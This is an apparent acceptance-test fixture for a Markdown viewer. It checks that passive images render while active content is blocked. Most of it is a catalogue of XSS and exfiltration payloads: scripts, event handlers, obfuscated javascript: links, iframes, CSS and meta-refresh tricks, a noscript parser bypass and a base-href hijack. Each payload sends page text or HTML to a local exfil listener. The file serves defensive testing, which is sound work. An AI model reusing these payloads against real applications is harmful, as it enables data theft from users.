# Active content acceptance

This document is hostile on purpose. Every active construct below tries to reach
`http://127.0.0.1:47631/exfil/<vector>`; none of those requests may ever arrive. The passive images
under `/img/` must arrive, and the local images must render.

## Interaction

[Jump to the end](#end-of-document) and <a id="js-link" href="javascript:location='http://127.0.0.1:47631/exfil/javascript-link?d='+encodeURIComponent(document.title)">Run javascript link</a>

## Passive content that must keep working

![Passive remote image](http://127.0.0.1:47631/img/passive-markdown.png)

![Authentication challenge must not sign in](http://localhost:47631/auth/ntlm)

<img src="http://127.0.0.1:47631/img/passive-html.png" width="64" height="32" alt="Passive remote HTML image">

![Local image](local.png)

<p align="center"><img src="local.png" width="48" height="48" alt="Sized local image"></p>

<details open><summary>Details stay</summary>

<kbd>Ctrl</kbd>+<kbd>C</kbd>, H<sub>2</sub>O, x<sup>2</sup>, and <mark>marked</mark> text stay.

</details>

## Script

<script>new Image().src = 'http://127.0.0.1:47631/exfil/script-image?d=' + encodeURIComponent(document.body.innerText.slice(0, 200));</script>

<script>fetch('http://127.0.0.1:47631/exfil/script-fetch', { method: 'POST', mode: 'no-cors', body: document.documentElement.outerHTML });</script>

<script src="http://127.0.0.1:47631/exfil/script-src"></script>

<script>if (window.chrome && window.chrome.webview) { window.chrome.webview.postMessage('tigermarkview:help'); }</script>

<svg><script>fetch('http://127.0.0.1:47631/exfil/svg-script')</script></svg>

## Event handlers

<img src="missing-on-purpose.png" onerror="new Image().src='http://127.0.0.1:47631/exfil/onerror?d='+encodeURIComponent(document.title)">

<svg onload="fetch('http://127.0.0.1:47631/exfil/svg-onload')"><path d="M0 0h1v1z"></path></svg>

<details open ontoggle="navigator.sendBeacon('http://127.0.0.1:47631/exfil/ontoggle', document.body.innerText)"><summary>Toggle</summary>x</details>

<input autofocus onfocus="fetch('http://127.0.0.1:47631/exfil/autofocus')">

<body onload="fetch('http://127.0.0.1:47631/exfil/body-onload')">

<svg><animate onbegin="fetch('http://127.0.0.1:47631/exfil/svg-animate')" attributeName="x" dur="1s"></animate></svg>

A paragraph with a generic attribute. {onmouseover="fetch('http://127.0.0.1:47631/exfil/generic-attribute')"}

## Active URLs

<a href="JaVaScRiPt:fetch('http://127.0.0.1:47631/exfil/mixed-case-javascript')">Mixed-case javascript link</a>

<a href="jav&#x09;ascript:fetch('http://127.0.0.1:47631/exfil/entity-javascript')">Entity javascript link</a>

[Markdown javascript link](javascript:fetch('http://127.0.0.1:47631/exfil/markdown-javascript'))

<a href="data:text/html,%3Cscript%3Efetch('http://127.0.0.1:47631/exfil/data-link')%3C/script%3E">Data document link</a>

## Embedding

<iframe src="http://127.0.0.1:47631/exfil/iframe"></iframe>

<iframe srcdoc="&lt;script&gt;fetch('http://127.0.0.1:47631/exfil/iframe-srcdoc')&lt;/script&gt;"></iframe>

<object data="http://127.0.0.1:47631/exfil/object"></object>

<embed src="http://127.0.0.1:47631/exfil/embed">

<video poster="http://127.0.0.1:47631/exfil/video-poster" autoplay><source src="http://127.0.0.1:47631/exfil/video-source"></video>

<link rel="stylesheet" href="http://127.0.0.1:47631/exfil/link-stylesheet">

<style>@import url('http://127.0.0.1:47631/exfil/style-import'); input[value^="s"] { background: url('http://127.0.0.1:47631/exfil/style-selector'); }</style>

<meta http-equiv="refresh" content="1;url=http://127.0.0.1:47631/exfil/meta-refresh">

<form action="http://127.0.0.1:47631/exfil/form"><input name="q" value="secret"><button>Send</button></form>

<noscript><p title="</noscript><img src=x onerror=fetch('http://127.0.0.1:47631/exfil/noscript')>"></p></noscript>

<base href="http://127.0.0.1:47631/exfil/base/">

![After a document base](base-probe.png)

## End of document

The in-document link at the top scrolls here only through TigerMarkView's own anchor script.
